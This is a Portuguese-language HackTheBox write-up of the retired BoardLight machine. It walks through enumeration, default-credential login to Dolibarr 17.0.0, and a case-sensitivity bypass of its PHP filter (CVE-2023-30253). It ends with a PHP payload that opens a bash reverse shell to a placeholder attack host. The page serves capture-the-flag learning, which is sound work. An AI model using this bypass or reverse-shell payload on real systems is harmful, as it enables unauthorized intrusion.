<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>HTB: BoardLight | Sérgio Muniz</title>
  <meta name="description" content="Writeup técnico avançado do BoardLight, incluindo exploração do Dolibarr, PHP injection e CVE‑2022‑37706.">
  <meta property="og:title" content="HTB: BoardLight">
  <meta property="og:locale" content="en_US">
  <meta property="og:description" content="Writeup técnico avançado do BoardLight">
  <meta property="og:type" content="article">
  <style>
    :root {
      --bg-main: #050608;           /* fundo principal, quase preto, estilo 0xdf */
      --bg-card: #101218;           /* blocos de conteúdo um pouco mais claros */
      --border-subtle: #2a2f3a;     /* borda cinza-escuro azulada */
      --accent: #ff4b4b;            /* vermelho para headings tipo "Box Info" */
      --accent-soft: #2b0a0a;       /* vermelho bem escuro para detalhes */
      --text-main: #e5e5e5;         /* texto principal bem claro */
      --text-muted: #9b9b9b;        /* texto secundário */
      --title: #f5f5f5;             /* títulos próximos do branco */
      --link: #7aa2ff;              /* links azulados como no tema do blog */
      --htb-green: #a3e635;         /* verde HTB para pequenos destaques */
    }

    html, body { margin: 0; padding: 0; }
    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: #050608;
      color: var(--text-main);
      -webkit-font-smoothing: antialiased;
    }

    .container {
      max-width: 1100px;
      margin: 40px auto 60px;
      padding: 0 24px;
    }

    h1, h2, h3 {
      color: var(--title);
      font-weight: 600;
    }

    .header {
      margin-bottom: 32px;
      display: flex;
      align-items: center;
      gap: 24px;
    }

    .icon-badge {
      flex: 0 0 auto;
    }

    .icon-badge svg {
      display: block;
      width: 96px;
      height: 96px;
    }

    .header-text {
      flex: 1 1 auto;
    }

    .badge-ring {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      background: radial-gradient(circle at center, #1f2933 0, #050608 70%);
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 24px rgba(0, 0, 0, 0.8);
      border: 1px solid #374151;
    }

    .header img {
      width: 90px;
      height: 90px;
      border-radius: 50%;
      display: block;
    }

    .title-main {
      font-size: 2.2rem;
      margin: 0 0 4px;
    }

    .subtitle {
      color: var(--text-muted);
      font-size: 0.95rem;
      margin: 0;
    }

    .accent-divider {
      width: 100%;
      height: 1px;
      background: #1f2933;
      margin: 16px 0 10px;
    }

    .meta {
      display: flex;
      flex-wrap: wrap;
      gap: 18px;
      margin-top: 6px;
      font-size: 0.85rem;
    }

    .meta-item {
      min-width: 120px;
    }

    .meta-label {
      text-transform: uppercase;
      letter-spacing: 0.12em;
      font-size: 0.72rem;
      color: var(--text-muted);
      display: block;
      margin-bottom: 2px;
    }

    .meta-value {
      color: var(--htb-green);
      font-weight: 600;
    }

    .card {
      background: var(--bg-card);
      padding: 22px 22px 26px;
      border-radius: 4px;
      border: 1px solid var(--border-subtle);
      margin-bottom: 32px;
      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.85);
    }

    .site-figure {
      margin: 18px 0 10px;
      display: flex;
      justify-content: center;
    }

    .site-figure svg {
      max-width: 640px;
      height: auto;
      border-radius: 8px;
      border: 1px solid #1f2933;
      box-shadow: 0 0 26px rgba(0, 0, 0, 0.8);
      background: #0b0b0d;
      display: block;
    }

    .contact-figure {
      margin: 12px 0 4px;
      display: flex;
      justify-content: center;
    }

    .contact-figure svg {
      width: 260px;
      height: auto;
      border-radius: 8px;
      border: 1px solid #1f2933;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.85);
      background: #050608;
      display: block;
    }

    .dolibarr-figure {
      margin: 14px 0 14px;
      display: flex;
      justify-content: center;
    }

    .dolibarr-figure svg {
      max-width: 320px;
      height: auto;
      border-radius: 10px;
      border: 1px solid #1f2933;
      box-shadow: 0 0 26px rgba(0, 0, 0, 0.9);
      background: #0b1120;
      display: block;
    }

    .dolibarr-auth-figure {
      margin: 10px 0 16px;
      display: flex;
      justify-content: center;
    }

    .dolibarr-auth-figure svg {
      max-width: 640px;
      height: auto;
      border-radius: 8px;
      border: 1px solid #1f2933;
      box-shadow: 0 0 24px rgba(0, 0, 0, 0.9);
      background: #000000;
      display: block;
    }

    .dolibarr-sites-figure {
      margin: 10px 0 16px;
      display: flex;
      justify-content: center;
    }

    .dolibarr-sites-figure svg {
      max-width: 640px;
      height: auto;
      border-radius: 8px;
      border: 1px solid #1f2933;
      box-shadow: 0 0 24px rgba(0, 0, 0, 0.9);
      background: #ffffff;
      display: block;
    }

    .dolibarr-phpinj-figure {
      margin: 10px 0 16px;
      display: flex;
      justify-content: center;
    }

    .dolibarr-phpinj-figure svg {
      max-width: 640px;
      height: auto;
      border-radius: 8px;
      border: 1px solid #1f2933;
      box-shadow: 0 0 24px rgba(0, 0, 0, 0.9);
      background: #0b1120;
      display: block;
    }

    h2 {
      margin-top: 0;
      padding-bottom: 4px;
      border-bottom: 1px solid #2a2f3a;
      margin-bottom: 12px;
      color: var(--accent);
      font-weight: 500;
      font-size: 1.1rem;
    }

    p {
      line-height: 1.7;
      font-size: 0.98rem;
      color: var(--text-main);
    }

    pre {
      background: #050608;
      padding: 12px 14px;
      border-radius: 4px;
      border: 1px solid #1f2937;
      margin-bottom: 18px;
      overflow-x: hidden;
      position: relative;
      color: #e5e7eb;
      font-family: "Cascadia Code", "Fira Code", Menlo, Consolas, monospace;
      font-size: 0.9rem;
      white-space: pre-wrap;
      word-break: break-word;
    }

    pre::before {
      content: "powershell";
      position: absolute;
      top: 6px;
      right: 10px;
      font-size: 0.7rem;
      text-transform: uppercase;
      letter-spacing: 0.1em;
      color: var(--text-muted);
    }

    code {
      color: #e5e7eb;
      font-family: "Cascadia Code", "Fira Code", Menlo, Consolas, monospace;
      font-size: 0.9rem;
    }

    a { color: var(--link); text-decoration: none; }
    a:hover { text-decoration: underline; }

    @media (max-width: 768px) {
  .container {
    margin: 20px auto 40px;
    padding: 0 12px;
  }

  .header {
    flex-direction: column;
    align-items: flex-start;
    gap: 16px;
  }

  .icon-badge {
    align-self: center;
  }

  .title-main {
    font-size: 1.6rem;
    text-align: left;
  }

  .subtitle {
    font-size: 0.85rem;
  }

  .meta {
    gap: 10px;
  }

  .card {
    padding: 16px 14px 20px;
  }

  .site-figure svg,
  .dolibarr-auth-figure svg,
  .dolibarr-sites-figure svg,
  .dolibarr-phpinj-figure svg,
  .dolibarr-figure svg,
  .contact-figure svg {
    max-width: 100%;
    width: 100%;
  }
}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="icon-badge">
        <svg viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="BoardLight icon">
          <defs>
            <radialGradient id="outerGlow" cx="50%" cy="50%" r="50%">
              <stop offset="0%" stop-color="#16a34a" stop-opacity="0.2" />
              <stop offset="60%" stop-color="#16a34a" stop-opacity="0.0" />
            </radialGradient>
            <radialGradient id="coreGlow" cx="50%" cy="50%" r="50%">
              <stop offset="0%" stop-color="#fee2e2" />
              <stop offset="35%" stop-color="#f97373" />
              <stop offset="80%" stop-color="#7f1d1d" />
            </radialGradient>
          </defs>
          <!-- outer ring -->
          <circle cx="60" cy="60" r="56" fill="#052e16" stroke="#84cc16" stroke-width="8" />
          <circle cx="60" cy="60" r="52" fill="#022c22" />
          <circle cx="60" cy="60" r="52" fill="url(#outerGlow)" />
          <!-- circuit board plate -->
          <rect x="30" y="30" width="60" height="60" rx="6" fill="#020617" stroke="#0891b2" stroke-width="2" />
          <rect x="34" y="34" width="52" height="52" rx="4" fill="#0f172a" />
          <!-- corner pads -->
          <rect x="32" y="32" width="16" height="10" rx="2" fill="#f97316" />
          <rect x="72" y="32" width="16" height="10" rx="2" fill="#f97316" />
          <rect x="32" y="78" width="16" height="10" rx="2" fill="#f97316" />
          <rect x="72" y="78" width="16" height="10" rx="2" fill="#f97316" />
          <!-- traces / components (simplified) -->
          <rect x="40" y="44" width="12" height="4" fill="#9ca3af" />
          <rect x="40" y="50" width="16" height="3" fill="#6b7280" />
          <rect x="40" y="56" width="10" height="3" fill="#6b7280" />
          <rect x="70" y="46" width="14" height="4" fill="#6b7280" />
          <rect x="70" y="52" width="10" height="3" fill="#9ca3af" />
          <!-- central core -->
          <circle cx="60" cy="60" r="14" fill="#7f1d1d" />
          <circle cx="60" cy="60" r="11" fill="url(#coreGlow)" />
          <circle cx="60" cy="60" r="4" fill="#fee2e2" />
        </svg>
      </div>
      <div class="header-text">
        <h1 class="title-main">HTB: BoardLight</h1>
        <p class="subtitle">Writeup técnico avançado por Sérgio Muniz</p>
        <div class="accent-divider"></div>
        <div class="meta">
          <div class="meta-item">
            <span class="meta-label">OS</span>
            <span class="meta-value">Linux</span>
          </div>
          <div class="meta-item">
            <span class="meta-label">Release Date</span>
            <span class="meta-value">25 May 2024</span>
          </div>
          <div class="meta-item">
            <span class="meta-label">Difficulty</span>
            <span class="meta-value">Easy</span>
          </div>
          <div class="meta-item">
            <span class="meta-label">State</span>
            <span class="meta-value">Retired</span>
          </div>
        </div>
      </div>
    </div>

    <div class="card">

  <h2>Enumeração Inicial</h2>
  <p>Para o alvo <code>10.129.231.37</code>, a enumeração de portas foi conduzida a partir da attackbox em PowerShell, com criação de diretório dedicado para os scans e dois passes de Nmap: full TCP e scan direcionado.</p>
  <pre><code>$IP      = "10.129.231.37"
$Domain  = "board.htb"
$ScansDir = "$HOME/scans"
$LootDir  = "$HOME/loot_10_129_231_37"

if (-not (Test-Path $ScansDir)) { New-Item -ItemType Directory -Path $ScansDir | Out-Null }
if (-not (Test-Path $LootDir))  { New-Item -ItemType Directory -Path $LootDir  | Out-Null }

nmap -Pn -sS -p- --min-rate 10000 -n -vvv -oA "$ScansDir/full_tcp_allports_10_129_231_37" $IP</code></pre>
  <pre><code>nmap -Pn -sCV -p 22,80 -n -vvv -oA "$ScansDir/targeted_22_80_10_129_231_37" $IP

22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http  Apache/2.4.41 (Ubuntu)</code></pre>
  <p>O Nmap identificou apenas duas portas TCP abertas: SSH (22) e HTTP (80). Com base nas versões do OpenSSH e do Apache, o host provavelmente está rodando Ubuntu 20.04 (focal). O título HTTP retornado (<code>Site doesn't have a title</code>) indica que não se trata da página padrão do Apache, sugerindo uma aplicação própria exposta na porta 80.</p>

  <h2>Website – TCP 80 (board.htb)</h2>
  <div class="site-figure">
    <svg viewBox="0 0 640 260" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Mockup desktop do site BoardLight">
      <!-- fundo geral da página -->
      <rect x="8" y="8" width="624" height="244" rx="10" fill="#050608" stroke="#374151" stroke-width="2" />

      <!-- navbar -->
      <rect x="20" y="20" width="600" height="32" rx="4" fill="#050608" stroke="#4b5563" stroke-width="1" />
      <text x="60" y="40" fill="#f9fafb" font-size="10" font-family="Segoe UI, Arial, sans-serif">BOARDLIGHT</text>
      <text x="340" y="40" text-anchor="middle" fill="#e5e5e5" font-size="9" font-family="Segoe UI, Arial, sans-serif">Home   About   What we do   Contact us</text>

      <!-- hero: bloco esquerdo -->
      <rect x="20" y="64" width="360" height="110" rx="6" fill="#111827" />
      <text x="40" y="90" fill="#f9fafb" font-size="11" font-family="Segoe UI, Arial, sans-serif" letter-spacing="2">WELCOME TO</text>
      <text x="40" y="118" fill="#f9fafb" font-size="26" font-weight="bold" font-family="Segoe UI, Arial, sans-serif">BOARDLIGHT</text>
      <text x="40" y="140" fill="#e5e5e5" font-size="9" font-family="Segoe UI, Arial, sans-serif">Cybersecurity consulting firm protecting your</text>
      <text x="40" y="154" fill="#9ca3af" font-size="9" font-family="Segoe UI, Arial, sans-serif">business from modern cyber threats.</text>
      <rect x="40" y="170" width="120" height="20" rx="10" fill="#facc15" />
      <text x="100" y="184" text-anchor="middle" fill="#111827" font-size="10" font-family="Segoe UI, Arial, sans-serif">Contact us</text>

      <!-- hero: imagem à direita -->
      <rect x="400" y="64" width="220" height="110" rx="6" fill="#020617" stroke="#1f2937" stroke-width="1" />
      <rect x="410" y="74" width="200" height="60" rx="4" fill="#0f172a" />
      <rect x="410" y="140" width="90" height="24" rx="4" fill="#111827" />
      <rect x="520" y="140" width="90" height="24" rx="4" fill="#111827" />

      <!-- seção WHAT WE DO -->
      <text x="40" y="212" fill="#f9fafb" font-size="12" font-family="Segoe UI, Arial, sans-serif" font-weight="bold">WHAT WE DO</text>
      <line x1="40" y1="218" x2="180" y2="218" stroke="#facc15" stroke-width="2" />

      <!-- três colunas -->
      <rect x="40" y="224" width="150" height="20" rx="4" fill="#111827" />
      <rect x="245" y="224" width="150" height="20" rx="4" fill="#111827" />
      <rect x="450" y="224" width="150" height="20" rx="4" fill="#111827" />
      <text x="115" y="238" text-anchor="middle" fill="#f9fafb" font-size="9" font-family="Segoe UI, Arial, sans-serif">Consulting</text>
      <text x="320" y="238" text-anchor="middle" fill="#f9fafb" font-size="9" font-family="Segoe UI, Arial, sans-serif">Cyber Tool Development</text>
      <text x="525" y="238" text-anchor="middle" fill="#f9fafb" font-size="9" font-family="Segoe UI, Arial, sans-serif">Site Development</text>
    </svg>
  </div>
  <p>O serviço HTTP em <code>http://10.129.231.37</code> apresenta uma landing page de uma empresa de cibersegurança. A página contém um formulário de contato aparentemente estático (sem backend visível) e um endereço de e-mail no rodapé.</p>
  <p>No conteúdo é exposto o domínio <code>board.htb</code>, que foi adicionado ao <code>/etc/hosts</code>. O acesso via <code>http://board.htb</code> retorna o mesmo conteúdo servido quando acessamos diretamente pelo IP.</p>
  <p>O menu superior referencia <code>about.php</code>, <code>do.php</code> e <code>contact.php</code>, mas essas rotas apenas carregam seções distintas da mesma página (mesmo cabeçalho e rodapé), sem lógica adicional aparente ou novos pontos de entrada para exploração.</p>

  <div class="contact-figure">
    <svg viewBox="0 0 260 120" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Bloco de contato do site BoardLight">
      <!-- fundo -->
      <rect x="4" y="4" width="252" height="112" rx="10" fill="#111827" stroke="#374151" stroke-width="1.5" />

      <!-- título -->
      <text x="24" y="24" fill="#f9fafb" font-size="12" font-family="Segoe UI, Arial, sans-serif">About Shop</text>

      <!-- ícone localização -->
      <circle cx="24" cy="44" r="8" fill="#111827" stroke="#9ca3af" stroke-width="1" />
      <path d="M24 39 a4 4 0 1 1 0 8 a4 4 0 1 1 0 -8z" fill="#facc15" />
      <text x="40" y="48" fill="#e5e5e5" font-size="8" font-family="Segoe UI, Arial, sans-serif">123 Main Street,</text>
      <text x="40" y="58" fill="#e5e5e5" font-size="8" font-family="Segoe UI, Arial, sans-serif">Anytown, UK</text>

      <!-- ícone telefone -->
      <circle cx="24" cy="74" r="8" fill="#111827" stroke="#9ca3af" stroke-width="1" />
      <rect x="21" y="70" width="6" height="8" rx="1" fill="#facc15" />
      <text x="40" y="78" fill="#e5e5e5" font-size="8" font-family="Segoe UI, Arial, sans-serif">+01 1234567890</text>

      <!-- ícone e-mail -->
      <circle cx="24" cy="98" r="8" fill="#111827" stroke="#9ca3af" stroke-width="1" />
      <rect x="19" y="94" width="10" height="8" rx="1" fill="#facc15" />
      <polyline points="19,94 24,98 29,94" fill="none" stroke="#111827" stroke-width="0.8" />
      <text x="40" y="102" fill="#facc15" font-size="8" font-family="Segoe UI, Arial, sans-serif">info@board.htb</text>
    </svg>
  </div>

  <h2>Directory Brute Force – Feroxbuster</h2>
  <p>Para tentar descobrir paths e arquivos ocultos na aplicação principal em <code>board.htb</code>, rodei o <code>feroxbuster</code> a partir da attackbox, focando em extensões <code>.php</code> e usando a wordlist clássica <code>common.txt</code> do DIRB.</p>
  <pre><code>feroxbuster -u "http://$Domain/" -x php -w "/usr/share/wordlists/dirb/common.txt" -o "$LootDir/ferox_board_root_php.txt"</code></pre>
  <p>O resultado trouxe basicamente os recursos já identificados manualmente: <code>/index.php</code>, <code>/about.php</code>, <code>/do.php</code>, <code>/contact.php</code>, além das pastas estáticas <code>/css/</code>, <code>/js/</code> e <code>/images/</code> (com arquivos como <code>bootstrap.css</code>, <code>bootstrap.js</code>, <code>jquery-3.4.1.min.js</code> e imagens usadas no layout). Nenhum diretório administrativo, backup ou painel oculto apareceu nesse brute force, indicando que o caminho de exploração não virá de uma URL “fácil” na raiz.</p>

  <h2>Subdomain Brute Force – ffuf</h2>
  <p>Como o site já expunha o domínio <code>board.htb</code>, a etapa seguinte foi procurar virtual hosts ocultos bruteforçando o cabeçalho <code>Host</code> com o <code>ffuf</code>, reutilizando as variáveis <code>$IP</code>, <code>$Domain</code> e <code>$LootDir</code> definidas anteriormente.</p>
  <pre><code>if (Test-Path "/opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt") { $Wordlist="/opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt" } else { $Wordlist="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt" }

ffuf -u "http://$IP/" -H "Host: FUZZ.$Domain" -w "$Wordlist" -mc all -ac -o "$LootDir/ffuf_board_vhosts.txt"</code></pre>
  <p>A grande maioria dos nomes testados retornou respostas filtradas ou erros genéricos. O subdomínio <code>crm.board.htb</code>, porém, respondeu com <code>200</code> e um corpo HTML diferente, enquanto valores como <code>www</code> e <code>mail</code> só geraram <code>400 Bad Request</code>. Isso indica claramente um virtual host configurado para <code>crm.board.htb</code>.</p>
  <pre><code>sudo sh -c "echo '$IP $Domain crm.$Domain' >> /etc/hosts"</code></pre>
  <p>Com essa entrada, tanto <code>board.htb</code> quanto <code>crm.board.htb</code> passam a resolver localmente para o IP da máquina, permitindo acessar diretamente o host de CRM explorado nas próximas etapas.</p>

  <h2>Tech Stack</h2>
  <p>As páginas (<code>index.php</code>, <code>about.php</code>, <code>do.php</code>, <code>contact.php</code>) indicam uma aplicação escrita em PHP servida por Apache 2.4.41 (Ubuntu). Os cabeçalhos HTTP não expõem nada além do banner padrão do Apache e do <code>Content-Type</code>:</p>
  <pre><code>HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8</code></pre>
  
  <p>Para caminhos válidos terminando em <code>.php</code> que resultam em erro, o 404 exibido difere do padrão do Apache, consistente com o comportamento do PHP-FPM. Isso confirma o stack Apache + PHP-FPM, com o Apache atuando como frontend e encaminhando as requisições dinâmicas para o processo PHP.</p>

  <h2>crm.board.htb – Dolibarr</h2>
  <div class="dolibarr-figure">
    <svg viewBox="0 0 320 190" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Tela de login do Dolibarr 17.0.0">
      <!-- fundo geral -->
      <rect x="0" y="0" width="320" height="190" rx="12" fill="#e5e7eb" />

      <!-- faixa azul superior com versão -->
      <path d="M0 0 H320 V62 Q160 82 0 62 Z" fill="#1f3456" />
      <text x="160" y="28" text-anchor="middle" fill="#f9fafb" font-size="11" font-family="Segoe UI, Arial, sans-serif">Dolibarr 17.0.0</text>

      <!-- card branco central -->
      <rect x="32" y="46" width="256" height="116" rx="8" fill="#ffffff" />

      <!-- logo Dolibarr simplificado -->
      <text x="160" y="72" text-anchor="middle" fill="#204c78" font-size="24" font-weight="bold" font-family="Segoe UI, Arial, sans-serif">Dolibarr</text>

      <!-- campo Login -->
      <circle cx="70" cy="92" r="5" fill="#111827" />
      <line x1="88" y1="94" x2="252" y2="94" stroke="#e5e7eb" stroke-width="2" />
      <text x="92" y="91" fill="#9ca3af" font-size="9" font-family="Segoe UI, Arial, sans-serif">Login</text>

      <!-- campo Password -->
      <circle cx="70" cy="114" r="5" fill="#111827" />
      <line x1="88" y1="116" x2="252" y2="116" stroke="#e5e7eb" stroke-width="2" />
      <text x="92" y="113" fill="#9ca3af" font-size="9" font-family="Segoe UI, Arial, sans-serif">Password</text>

      <!-- botão LOGIN -->
      <rect x="132" y="126" width="56" height="20" rx="2" fill="#f5f5f5" stroke="#d1d5db" stroke-width="1" />
      <text x="160" y="139" text-anchor="middle" fill="#4b5563" font-size="10" font-family="Segoe UI, Arial, sans-serif" font-weight="bold">LOGIN</text>
    </svg>
  </div>
  <p>O host virtual <code>crm.board.htb</code> apresenta uma página de login de uma instância do Dolibarr ERP/CRM. Dolibarr é uma plataforma open-source de planejamento de recursos empresariais (ERP) e gerenciamento de relacionamento com clientes (CRM), com o código-fonte disponível publicamente no GitHub.</p>
  <p>Logo acima da área do formulário de login é exibida a versão exata da aplicação, indicando explicitamente <strong>Dolibarr 17.0.0</strong>. Essa identificação de versão é crucial para, nas próximas etapas, cruzar com vulnerabilidades e exploits conhecidos voltados para essa release específica.</p>

  <h2>Auth – Credenciais padrão</h2>
  <p>Antes de partir para exploração, pesquisei por credenciais padrão do Dolibarr em fóruns e issues públicas. Vários posts antigos sugerem pares como <code>admin / admin</code> e, em versões mais novas, <code>admin / changeme123</code>.</p>
  <p>Na instância em <code>crm.board.htb</code>, o login com <code>admin / admin</code> funciona e cria uma sessão válida para o usuário <code>admin</code>, mas o painel exibe imediatamente um banner de <strong>Access denied</strong>, indicando que esse usuário não possui todas as permissões administrativas esperadas.</p>
  <div class="dolibarr-auth-figure">
    <svg viewBox="0 0 640 180" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Painel Dolibarr com Access denied para o usuário admin">
      <!-- barra superior -->
      <rect x="0" y="0" width="640" height="34" fill="#1f3456" />
      <text x="40" y="22" fill="#f9fafb" font-size="10" font-family="Segoe UI, Arial, sans-serif">Home   Tools   Websites</text>
      <text x="560" y="22" fill="#e5e7eb" font-size="10" font-family="Segoe UI, Arial, sans-serif">17.0.0</text>
      <circle cx="612" cy="17" r="11" fill="#111827" stroke="#e5e7eb" stroke-width="1" />
      <text x="612" y="21" text-anchor="middle" fill="#e5e7eb" font-size="8" font-family="Segoe UI, Arial, sans-serif">admin</text>

      <!-- sidebar esquerda -->
      <rect x="0" y="34" width="170" height="146" fill="#f3f4f6" />
      <text x="24" y="56" fill="#6b7280" font-size="9" font-family="Segoe UI, Arial, sans-serif">Search</text>
      <line x1="24" y1="60" x2="146" y2="60" stroke="#d1d5db" stroke-width="1" />
      <text x="24" y="88" fill="#111827" font-size="10" font-family="Segoe UI, Arial, sans-serif" font-weight="bold">▌ My Dashboard</text>
      <text x="24" y="112" fill="#9ca3af" font-size="10" font-family="Segoe UI, Arial, sans-serif">Setup</text>
      <text x="24" y="136" fill="#9ca3af" font-size="10" font-family="Segoe UI, Arial, sans-serif">Admin Tools</text>
      <text x="24" y="160" fill="#9ca3af" font-size="10" font-family="Segoe UI, Arial, sans-serif">Users &amp; Groups</text>

      <!-- área principal -->
      <rect x="170" y="34" width="470" height="146" fill="#ffffff" />

      <!-- banner Access denied -->
      <rect x="190" y="52" width="430" height="50" fill="#fecaca" stroke="#f87171" stroke-width="1" />
      <text x="205" y="70" fill="#b91c1c" font-size="11" font-family="Segoe UI, Arial, sans-serif" font-weight="bold">Access denied.</text>
      <text x="205" y="84" fill="#7f1d1d" font-size="9" font-family="Segoe UI, Arial, sans-serif">You try to access a page, area or feature that is not allowed to your user.</text>

      <!-- texto abaixo -->
      <text x="190" y="118" fill="#111827" font-size="9" font-family="Segoe UI, Arial, sans-serif">Current login: admin</text>
      <text x="190" y="132" fill="#4b5563" font-size="8" font-family="Segoe UI, Arial, sans-serif">Permissions for this login can be defined by your Dolibarr administrator.</text>
    </svg>
  </div>

  <h2>Websites – Criação de sites</h2>
  <p>A maioria dos recursos do Dolibarr para o usuário <code>admin</code> está desativada, mas o módulo de Websites permite criar novos sites a partir do painel.</p>
  <div class="dolibarr-sites-figure">
    <svg viewBox="0 0 640 180" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Tela de Websites do Dolibarr sem sites criados">
      <!-- barra superior -->
      <rect x="0" y="0" width="640" height="34" fill="#1f3456" />
      <text x="40" y="22" fill="#f9fafb" font-size="10" font-family="Segoe UI, Arial, sans-serif">Home   Tools   Websites</text>
      <text x="560" y="22" fill="#e5e7eb" font-size="10" font-family="Segoe UI, Arial, sans-serif">17.0.0</text>
      <circle cx="612" cy="17" r="11" fill="#111827" stroke="#e5e7eb" stroke-width="1" />
      <text x="612" y="21" text-anchor="middle" fill="#e5e7eb" font-size="8" font-family="Segoe UI, Arial, sans-serif">admin</text>

      <!-- barra de seleção de website -->
      <rect x="0" y="34" width="640" height="32" fill="#e5e7eb" />
      <text x="20" y="54" fill="#4b5563" font-size="10" font-family="Segoe UI, Arial, sans-serif">Website:</text>
      <rect x="80" y="42" width="170" height="16" rx="2" fill="#ffffff" stroke="#d1d5db" stroke-width="1" />
      <polygon points="236,48 242,48 239,52" fill="#9ca3af" />
      <rect x="270" y="42" width="26" height="16" rx="8" fill="#ffffff" stroke="#d1d5db" stroke-width="1" />

      <!-- área principal branca -->
      <rect x="0" y="66" width="640" height="114" fill="#ffffff" />
      <text x="320" y="96" text-anchor="middle" fill="#6b7280" font-size="11" font-family="Segoe UI, Arial, sans-serif">No website has been created yet. Create one first.</text>

      <!-- engrenagens -->
      <!-- engrenagem maior -->
      <g transform="translate(340,118)">
        <circle cx="0" cy="0" r="18" fill="#d1d5db" />
        <circle cx="0" cy="0" r="8" fill="#ffffff" />
        <rect x="-2" y="-24" width="4" height="8" fill="#d1d5db" />
        <rect x="-2" y="16" width="4" height="8" fill="#d1d5db" />
        <rect x="16" y="-2" width="8" height="4" fill="#d1d5db" />
        <rect x="-24" y="-2" width="8" height="4" fill="#d1d5db" />
        <rect x="-16" y="-18" width="6" height="6" transform="rotate(-45)" fill="#d1d5db" />
        <rect x="10" y="12" width="6" height="6" transform="rotate(-45)" fill="#d1d5db" />
        <rect x="-16" y="12" width="6" height="6" transform="rotate(45)" fill="#d1d5db" />
        <rect x="10" y="-18" width="6" height="6" transform="rotate(45)" fill="#d1d5db" />
      </g>

      <!-- engrenagem menor -->
      <g transform="translate(304,124)">
        <circle cx="0" cy="0" r="13" fill="#e5e7eb" />
        <circle cx="0" cy="0" r="6" fill="#ffffff" />
        <rect x="-2" y="-18" width="4" height="6" fill="#e5e7eb" />
        <rect x="-2" y="12" width="4" height="6" fill="#e5e7eb" />
        <rect x="10" y="-2" width="6" height="4" fill="#e5e7eb" />
        <rect x="-16" y="-2" width="6" height="4" fill="#e5e7eb" />
      </g>
    </svg>
  </div>

  <h2>Exploração – PHP Injection</h2>
  <p>No contexto do lançamento do BoardLight, uma busca rápida por <code>"exploit dolibarr 17.0.0"</code> trazia apenas um resultado realmente relevante: um post de maio de 2023 da Swascan descrevendo o <strong>CVE‑2023‑30253</strong>. É razoável esperar que, depois que a máquina for aposentada, existam diversos POCs automatizados para esse bug, mas aqui o foco é entender o fluxo manual.</p>
  <p>Segundo o advisory da Swascan, um usuário com permissões de <em>"Read website contents"</em> e <em>"Create/modify website contents (HTML and JavaScript)"</em> consegue, na prática, <strong>executar código PHP arbitrário</strong> em páginas do módulo de Websites, contornando as restrições normais da aplicação. A interface deveria permitir apenas conteúdo HTML/JS, mas a validação é falha e aceita trechos PHP que serão processados pelo servidor.</p>
  <p>Na interface, o Dolibarr tenta impedir explicitamente esse tipo de abuso. Se eu criar um site, adicionar uma página e salvar com <code>&lt;?php phpinfo(); ?&gt;</code>, o editor exibe um banner vermelho informando que não tenho permissão para adicionar conteúdo PHP dinâmico em websites.</p>
  <p>O filtro, porém, é <em>case‑sensitive</em>: ao trocar o início da tag para <code>&lt;?Php phpinfo(); ?&gt;</code>, o conteúdo passa pela validação e é salvo normalmente, mesmo com o aviso dizendo o contrário.</p>
  <div class="dolibarr-phpinj-figure">
    <svg viewBox="0 0 640 210" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Bypass de filtro PHP no editor de Websites do Dolibarr">
      <!-- barra superior do módulo -->
      <rect x="0" y="0" width="640" height="34" fill="#1f3456" />
      <text x="40" y="22" fill="#f9fafb" font-size="10" font-family="Segoe UI, Arial, sans-serif">Home   Tools   Websites</text>
      <text x="560" y="22" fill="#e5e7eb" font-size="10" font-family="Segoe UI, Arial, sans-serif">17.0.0  admin</text>

      <!-- editor com banner de erro -->
      <rect x="12" y="40" width="616" height="80" rx="6" fill="#111827" stroke="#4b5563" stroke-width="1" />
      <rect x="20" y="48" width="600" height="24" rx="3" fill="#fecaca" stroke="#f87171" stroke-width="1" />
      <text x="28" y="64" fill="#7f1d1d" font-size="10" font-family="Segoe UI, Arial, sans-serif">You don't have permission to add or edit PHP dynamic content in websites.</text>
      <text x="24" y="90" fill="#e5e7eb" font-size="10" font-family="Cascadia Code, Fira Code, monospace">&lt;?Php phpinfo(); ?&gt;</text>

      <!-- divisor -->
      <line x1="0" y1="128" x2="640" y2="128" stroke="#374151" stroke-width="1" stroke-dasharray="4 4" />

      <!-- phpinfo abaixo -->
      <rect x="12" y="136" width="616" height="68" rx="6" fill="#f3f4f6" stroke="#d1d5db" stroke-width="1" />
      <text x="32" y="160" fill="#111827" font-size="14" font-family="Segoe UI, Arial, sans-serif" font-weight="bold">PHP Version 7.4.3-4ubuntu2.22</text>
      <text x="32" y="178" fill="#4b5563" font-size="9" font-family="Segoe UI, Arial, sans-serif">System: Linux boardlight · Server API: FPM/FastCGI · Path: /etc/php/7.4/fpm</text>
    </svg>
  </div>
  <p>Para que o código seja realmente interpretado, é necessário ativar a opção <strong>Show dynamic content</strong> ("Mostrar conteúdo dinâmico") na barra da página. Com essa flag ligada e o payload <code>phpinfo()</code> salvo, a pré‑visualização passa a exibir a página de informações do PHP, confirmando execução de código no lado do servidor.</p>
  <p>Depois de validar o bypass com <code>phpinfo()</code>, basta substituir o conteúdo pela chamada a <code>system()</code> disparando um reverseshell de volta para a máquina de ataque:</p>
  <pre><code>&lt;?Php system("bash -c 'bash -i &gt;&amp; /dev/tcp/ATTACKBOX/443 0&gt;&1'"); ?&gt;</code></pre>
